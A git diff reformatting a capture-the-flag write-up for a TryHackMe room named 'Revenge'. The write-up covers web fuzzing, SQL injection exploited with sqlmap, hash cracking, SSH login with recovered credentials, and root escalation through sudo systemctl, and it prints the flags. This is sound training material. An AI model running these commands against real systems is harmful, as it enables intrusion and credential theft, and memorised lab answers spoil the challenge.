@@ -2,29 +2,28 @@
 sticker: emoji//1f986
 ---
 
-# PORT SCAN
----
+# REVENGE
 
+## PORT SCAN
+
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 22   | SSH     |
 | 80   | HTTP    |
 
+## RECONNAISSANCE
 
-
-# RECONNAISSANCE
----
+***
 
 First of all, we can download a task file containing a message from Billy Joel:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609131337.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609131337.png)
 
 Now, let's proceed to check the website:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609131510.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609131510.png)
 
 Let's fuzz:
 
@@ -59,14 +58,13 @@ products                [Status: 200, Size: 7254, Words: 2103, Lines: 177, Durat
 requirements.txt        [Status: 200, Size: 258, Words: 1, Lines: 16, Duration: 235ms]
 ```
 
-
 The products section seems odd, if we check it out with a non existant product, this happens:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609132109.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609132109.png)
 
 I was thinking of IDOR but couldn't get anything out of it, back at the fuzzing scan, we got `requirements.txt`, let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609132816.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609132816.png)
 
 We are dealing with flask, we can try fuzzing again but with a python extension to check if we can get `app.py`:
 
@@ -102,7 +100,7 @@ app.py                  [Status: 200, Size: 2371, Words: 267, Lines: 82, Duratio
 
 There it is, let's download it and perform analysis on it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609133120.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609133120.png)
 
 In this exact part of the code, we can find this:
 
@@ -116,7 +114,6 @@ def product(product_id):
     return render_template('product.html', title=product_selected[1], result=product_selected)
 ```
 
-
 The vulnerable section is:
 
 ```python
@@ -127,18 +124,15 @@ This line directly interpolates `product_id` into an SQL query **without sanitiz
 
 Knowing this, we can proceed to exploitation.
 
+## EXPLOITATION
 
-
-# EXPLOITATION
----
-
+***
 
 Since we know SQLI is on the `products` section, we can use sqlmap to automate the exploitation process:
 
 ```
 sqlmap -u "http://IP/products/1" --dbs --batch --level=5 --risk=3
 ```
-
 
 We find the following databases:
 
@@ -151,23 +145,21 @@ available databases [5]:
 [*] sys
 ```
 
-
 Let's read the duckyinc one:
 
 ```
 sqlmap -u "http://10.10.38.213/products/1" -D duckyinc --dump --batch
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609134256.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609134256.png)
 
-We got our first flag: 
+We got our first flag:
 
 ```
 thm{br3ak1ng_4nd_3nt3r1ng}
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609134438.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609134438.png)
 
 We got some hashes, we can try getting them and cracking them with hashcat:
 
@@ -183,7 +175,7 @@ Now:
 hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609134802.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609134802.png)
 
 This is the password for the `server-admin` user:
 
@@ -191,20 +183,17 @@ This is the password for the `server-admin` user:
 server-admin:inuyasha
 ```
 
-
 Let's go into ssh:
 
 ```
 ssh server-admin@10.10.38.213
 ```
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609134933.png) Now, we can begin privilege escalation.
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609134933.png)
-Now, we can begin privilege escalation.
+## PRIVILEGE ESCALATION
 
-
-# PRIVILEGE ESCALATION
----
+***
 
 Let's check our sudo privileges first:
 
@@ -291,10 +280,9 @@ sudo /bin/systemctl restart duckyinc.service
 
 If we check `/tmp` directory:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609142735.png)
-As seen, we got the `sh` binary, let's run it to get a root shell:
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609142735.png) As seen, we got the `sh` binary, let's run it to get a root shell:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609142853.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609142853.png)
 
 Now, let's get second flag and root flag:
 
@@ -327,7 +315,7 @@ As seen, inside of the root directory, we can't find the flag, this is because w
 nano /var/www/duckyinc/templates/index.html
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609143131.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609143131.png)
 
 Once we modify the file, our root directory changes:
 
@@ -357,5 +345,4 @@ sh-4.4# cat /root/flag3.txt
 thm{m1ss10n_acc0mpl1sh3d}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250609143240.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250609143240.png)
